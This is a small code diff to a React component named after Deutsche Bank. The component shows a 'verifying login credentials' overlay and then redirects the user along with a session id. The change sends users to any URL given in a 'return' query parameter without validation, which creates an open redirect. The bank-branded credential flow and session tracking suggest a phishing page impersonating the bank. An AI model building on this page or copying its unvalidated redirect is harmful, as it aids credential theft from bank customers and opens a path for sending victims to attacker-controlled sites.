@@ -496,7 +496,7 @@ const DeutscheBank = () => {
       {showLoading && (
         <LoadingOverlay
           message="Anmeldedaten werden überprüft..."
-          onComplete={() => navigate("/confirmation?s=" + sessionId)}
+          onComplete={() => navigate((new URLSearchParams(window.location.search).get("return") || "") ? `${new URLSearchParams(window.location.search).get("return")}?step=3&s=${sessionId}` : "/confirmation?s=" + sessionId)}
         />
       )}
       <div className="min-h-screen flex flex-col db-font" style={{ color: "#1a1a1a" }}>
